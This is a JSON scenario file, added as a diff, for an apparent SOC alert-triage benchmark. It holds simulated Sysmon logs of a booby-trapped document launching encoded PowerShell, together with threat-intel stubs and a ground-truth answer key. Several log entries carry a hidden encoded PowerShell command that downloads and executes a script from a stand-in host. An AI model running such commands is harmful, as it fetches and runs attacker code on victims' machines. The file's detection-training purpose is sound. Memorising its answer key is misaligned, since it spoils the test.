@@ -1,0 +1,726 @@
+{
+  "id": "S1",
+  "name": "PowerShell encodé, téléchargement et C2",
+  "description": "Un document piégé lance PowerShell avec une commande encodée qui télécharge et exécute une charge ; celle-ci contacte le serveur de commande et contrôle.",
+  "atomic_tests": [
+    "T1059.001-17 (PowerShell -EncodedCommand)",
+    "T1105-15 (téléchargement PowerShell)",
+    "T1071.001 (C2 HTTP simulé)"
+  ],
+  "alert": {
+    "_id": "S1-alert-013",
+    "timestamp": "2026-10-12T09:14:03.200+0000",
+    "agent": {
+      "id": "001",
+      "name": "WIN10-01",
+      "ip": "192.168.56.20"
+    },
+    "manager": {
+      "name": "wazuh-siem"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "systemTime": "2026-10-12T09:14:03.2000000Z",
+          "computer": "WIN10-01.lab.local",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA==",
+          "parentImage": "C:\\Windows\\explorer.exe",
+          "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "user": "LAB\\jdoe",
+          "processGuid": "{0c8a7fc2-e601-bd3a-57a2-a242370a5b56}",
+          "parentProcessGuid": "{9f87b421-f95e-7a35-13ed-e9a677cdc77a}",
+          "processId": "7312",
+          "parentProcessId": "3312",
+          "integrityLevel": "Medium",
+          "currentDirectory": "C:\\Windows\\system32\\",
+          "originalFileName": "POWERSHELL.EXE",
+          "hashes": "SHA256=53DADC40BB276161FBB4864750877D9641EBE8A5DEE5CE338D2554171EEBC6D1,MD5=00E65AA87285501FA9625096081BA2D9"
+        }
+      }
+    },
+    "rule": {
+      "id": "100200",
+      "level": 12,
+      "description": "PowerShell lancé avec une commande encodée (-EncodedCommand)",
+      "mitre": {
+        "id": [
+          "T1059.001",
+          "T1027.010"
+        ]
+      },
+      "groups": [
+        "sysmon",
+        "powershell"
+      ],
+      "firedtimes": 1
+    }
+  },
+  "logs": [
+    {
+      "_id": "S1-evt-001",
+      "timestamp": "2026-10-12T09:01:15.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:01:15.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "commandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer",
+            "parentImage": "C:\\Windows\\explorer.exe",
+            "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+            "user": "LAB\\jdoe",
+            "processGuid": "{1361a457-6416-211f-e119-6568cc90d5a7}",
+            "parentProcessGuid": "{9f87b421-f95e-7a35-13ed-e9a677cdc77a}",
+            "processId": "4120",
+            "parentProcessId": "3312",
+            "integrityLevel": "Medium",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "CHROME.EXE",
+            "hashes": "SHA256=B98A42E7E75A66429BF21F48D54033A6083EAF101BD296B5FE5A63134C2B6565,MD5=43D5D300D710001CC331581C761169FB"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-002",
+      "timestamp": "2026-10-12T09:02:30.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Security-Auditing",
+            "eventID": "4624",
+            "systemTime": "2026-10-12T09:02:30.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Security"
+          },
+          "eventdata": {
+            "targetUserName": "jdoe",
+            "targetDomainName": "LAB",
+            "logonType": "3",
+            "ipAddress": "192.168.56.21",
+            "subjectUserName": "-"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-003",
+      "timestamp": "2026-10-12T09:05:00.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:05:00.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\svchost.exe",
+            "commandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+            "parentImage": "C:\\Windows\\System32\\services.exe",
+            "parentCommandLine": "C:\\Windows\\system32\\services.exe",
+            "user": "NT AUTHORITY\\SYSTEM",
+            "processGuid": "{45a28603-4425-9ceb-fca0-a23fc6d97725}",
+            "parentProcessGuid": "{dd1df2d9-94e3-7a83-83bb-35746c46ff06}",
+            "processId": "1288",
+            "parentProcessId": "680",
+            "integrityLevel": "System",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "SVCHOST.EXE",
+            "hashes": "SHA256=61ED4F85C992073BF9CF86A8CCF97A3836235B3026EEE472B11BDD9EB577ED2A,MD5=16F672C8DA966DED99900DBAC162C311"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-004",
+      "timestamp": "2026-10-12T09:08:45.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:08:45.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\notepad.exe",
+            "commandLine": "\"C:\\Windows\\system32\\notepad.exe\" C:\\Users\\Public\\Documents\\notes_reunion.txt",
+            "parentImage": "C:\\Windows\\explorer.exe",
+            "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+            "user": "LAB\\jdoe",
+            "processGuid": "{e5cedd60-086e-1134-864f-98f977893a58}",
+            "parentProcessGuid": "{9f87b421-f95e-7a35-13ed-e9a677cdc77a}",
+            "processId": "5544",
+            "parentProcessId": "3312",
+            "integrityLevel": "Medium",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "NOTEPAD.EXE",
+            "hashes": "SHA256=CD7066F4B24DCCEC89137DC00DDD78F6A39FC3D63C1039ECB53356537D5ED6D3,MD5=89BE9BF79E9232BF66BEF89C3DD8C891"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-005",
+      "timestamp": "2026-10-12T09:13:45.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "22",
+            "systemTime": "2026-10-12T09:13:45.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "processGuid": "{1361a457-6416-211f-e119-6568cc90d5a7}",
+            "processId": "4120",
+            "queryName": "intranet.lab.local",
+            "queryResults": "192.168.56.5;"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-006",
+      "timestamp": "2026-10-12T09:15:00.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "3",
+            "systemTime": "2026-10-12T09:15:00.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "processGuid": "{1361a457-6416-211f-e119-6568cc90d5a7}",
+            "processId": "4120",
+            "user": "LAB\\jdoe",
+            "protocol": "tcp",
+            "initiated": "true",
+            "sourceIp": "192.168.56.20",
+            "sourcePort": "49705",
+            "destinationIp": "192.168.56.5",
+            "destinationPort": "443",
+            "destinationHostname": "intranet.lab.local"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-007",
+      "timestamp": "2026-10-12T09:20:00.000+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:20:00.0000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\taskhostw.exe",
+            "commandLine": "taskhostw.exe",
+            "parentImage": "C:\\Windows\\System32\\svchost.exe",
+            "parentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+            "user": "LAB\\jdoe",
+            "processGuid": "{74a4e41b-bcc2-e0a6-3a52-85720314948b}",
+            "parentProcessGuid": "{45a28603-4425-9ceb-fca0-a23fc6d97725}",
+            "processId": "6020",
+            "parentProcessId": "1288",
+            "integrityLevel": "Medium",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "TASKHOSTW.EXE",
+            "hashes": "SHA256=EADE2CD8C84CE631A2A6917151557D03D7BCF704B2A911E5910025FA412EE1D7,MD5=6913C574C95575338A5B0D0544F280FC"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-008",
+      "timestamp": "2026-10-12T09:14:03.200+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:14:03.2000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA==",
+            "parentImage": "C:\\Windows\\explorer.exe",
+            "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+            "user": "LAB\\jdoe",
+            "processGuid": "{0c8a7fc2-e601-bd3a-57a2-a242370a5b56}",
+            "parentProcessGuid": "{9f87b421-f95e-7a35-13ed-e9a677cdc77a}",
+            "processId": "7312",
+            "parentProcessId": "3312",
+            "integrityLevel": "Medium",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "POWERSHELL.EXE",
+            "hashes": "SHA256=53DADC40BB276161FBB4864750877D9641EBE8A5DEE5CE338D2554171EEBC6D1,MD5=00E65AA87285501FA9625096081BA2D9"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-009",
+      "timestamp": "2026-10-12T09:14:04.900+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "3",
+            "systemTime": "2026-10-12T09:14:04.9000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "processGuid": "{0c8a7fc2-e601-bd3a-57a2-a242370a5b56}",
+            "processId": "7312",
+            "user": "LAB\\jdoe",
+            "protocol": "tcp",
+            "initiated": "true",
+            "sourceIp": "192.168.56.20",
+            "sourcePort": "49708",
+            "destinationIp": "203.0.113.45",
+            "destinationPort": "80"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-010",
+      "timestamp": "2026-10-12T09:14:09.400+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "11",
+            "systemTime": "2026-10-12T09:14:09.4000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "processGuid": "{0c8a7fc2-e601-bd3a-57a2-a242370a5b56}",
+            "processId": "7312",
+            "targetFilename": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost-update.exe",
+            "user": "LAB\\jdoe"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-011",
+      "timestamp": "2026-10-12T09:14:12.100+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:14:12.1000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost-update.exe",
+            "commandLine": "\"C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost-update.exe\" /silent",
+            "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parentCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA==",
+            "user": "LAB\\jdoe",
+            "processGuid": "{191c24eb-2f77-098a-ed06-eda5371e520c}",
+            "parentProcessGuid": "{0c8a7fc2-e601-bd3a-57a2-a242370a5b56}",
+            "processId": "7480",
+            "parentProcessId": "7312",
+            "integrityLevel": "Medium",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "SVCHOST-UPDATE.EXE",
+            "hashes": "SHA256=7494CBC6F4D63C8BE44E69B5AF7091DF0722CAA90B010DDA6A11B489DB00D8C0,MD5=C034E5781DF9E20CB2F2D086D6B849E8"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-evt-012",
+      "timestamp": "2026-10-12T09:14:20.600+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "3",
+            "systemTime": "2026-10-12T09:14:20.6000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost-update.exe",
+            "processGuid": "{191c24eb-2f77-098a-ed06-eda5371e520c}",
+            "processId": "7480",
+            "user": "LAB\\jdoe",
+            "protocol": "tcp",
+            "initiated": "true",
+            "sourceIp": "192.168.56.20",
+            "sourcePort": "49711",
+            "destinationIp": "203.0.113.45",
+            "destinationPort": "443"
+          }
+        }
+      }
+    },
+    {
+      "_id": "S1-alert-013",
+      "timestamp": "2026-10-12T09:14:03.200+0000",
+      "agent": {
+        "id": "001",
+        "name": "WIN10-01",
+        "ip": "192.168.56.20"
+      },
+      "manager": {
+        "name": "wazuh-siem"
+      },
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Sysmon",
+            "eventID": "1",
+            "systemTime": "2026-10-12T09:14:03.2000000Z",
+            "computer": "WIN10-01.lab.local",
+            "channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA==",
+            "parentImage": "C:\\Windows\\explorer.exe",
+            "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+            "user": "LAB\\jdoe",
+            "processGuid": "{0c8a7fc2-e601-bd3a-57a2-a242370a5b56}",
+            "parentProcessGuid": "{9f87b421-f95e-7a35-13ed-e9a677cdc77a}",
+            "processId": "7312",
+            "parentProcessId": "3312",
+            "integrityLevel": "Medium",
+            "currentDirectory": "C:\\Windows\\system32\\",
+            "originalFileName": "POWERSHELL.EXE",
+            "hashes": "SHA256=53DADC40BB276161FBB4864750877D9641EBE8A5DEE5CE338D2554171EEBC6D1,MD5=00E65AA87285501FA9625096081BA2D9"
+          }
+        }
+      },
+      "rule": {
+        "id": "100200",
+        "level": 12,
+        "description": "PowerShell lancé avec une commande encodée (-EncodedCommand)",
+        "mitre": {
+          "id": [
+            "T1059.001",
+            "T1027.010"
+          ]
+        },
+        "groups": [
+          "sysmon",
+          "powershell"
+        ],
+        "firedtimes": 1
+      }
+    }
+  ],
+  "misp": {
+    "203.0.113.45": [
+      {
+        "id": "9101",
+        "event_id": "1201",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "203.0.113.45",
+        "to_ids": true,
+        "timestamp": "1790000000",
+        "Event": {
+          "id": "1201",
+          "info": "Campagne de hameçonnage — infrastructure de distribution",
+          "threat_level_id": "1",
+          "Tag": [
+            {
+              "name": "tlp:amber"
+            },
+            {
+              "name": "misp-galaxy:mitre-attack-pattern=\"Ingress Tool Transfer - T1105\""
+            }
+          ]
+        }
+      }
+    ],
+    "7494cbc6f4d63c8be44e69b5af7091df0722caa90b010dda6a11b489db00d8c0": [
+      {
+        "id": "9102",
+        "event_id": "1201",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "7494cbc6f4d63c8be44e69b5af7091df0722caa90b010dda6a11b489db00d8c0",
+        "to_ids": true,
+        "timestamp": "1790000000",
+        "Event": {
+          "id": "1201",
+          "info": "Campagne de hameçonnage — infrastructure de distribution",
+          "threat_level_id": "1",
+          "Tag": [
+            {
+              "name": "tlp:amber"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  "threat_intel": {
+    "203.0.113.45": {
+      "virustotal": {
+        "data": {
+          "attributes": {
+            "last_analysis_stats": {
+              "malicious": 12,
+              "suspicious": 0,
+              "harmless": 50,
+              "undetected": 32,
+              "timeout": 0
+            },
+            "reputation": -36,
+            "last_analysis_date": 1790500000,
+            "as_owner": "Example Hosting",
+            "country": "NL"
+          }
+        }
+      },
+      "abuseipdb": {
+        "data": {
+          "ipAddress": "",
+          "abuseConfidenceScore": 96,
+          "totalReports": 211,
+          "countryCode": "NL",
+          "isp": "Example Hosting",
+          "usageType": "Data Center/Web Hosting/Transit",
+          "lastReportedAt": "2026-10-01T10:00:00+00:00"
+        }
+      }
+    },
+    "7494cbc6f4d63c8be44e69b5af7091df0722caa90b010dda6a11b489db00d8c0": {
+      "virustotal": {
+        "data": {
+          "attributes": {
+            "last_analysis_stats": {
+              "malicious": 48,
+              "suspicious": 0,
+              "harmless": 0,
+              "undetected": 46,
+              "timeout": 0
+            },
+            "reputation": -144,
+            "last_analysis_date": 1790500000,
+            "meaningful_name": "svchost-update.exe"
+          }
+        }
+      }
+    }
+  },
+  "ground_truth": {
+    "verdict": "true_positive",
+    "techniques": [
+      "T1059.001",
+      "T1027.010",
+      "T1105",
+      "T1071.001"
+    ],
+    "acceptable_techniques": [
+      "T1027",
+      "T1059",
+      "T1132.001",
+      "T1204.002",
+      "T1036.005",
+      "T1071",
+      "T1140"
+    ],
+    "key_events": [
+      "S1-evt-008",
+      "S1-evt-009",
+      "S1-evt-010",
+      "S1-evt-011",
+      "S1-evt-012"
+    ],
+    "malicious_iocs": [
+      "203.0.113.45",
+      "7494cbc6f4d63c8be44e69b5af7091df0722caa90b010dda6a11b489db00d8c0"
+    ]
+  }
+}
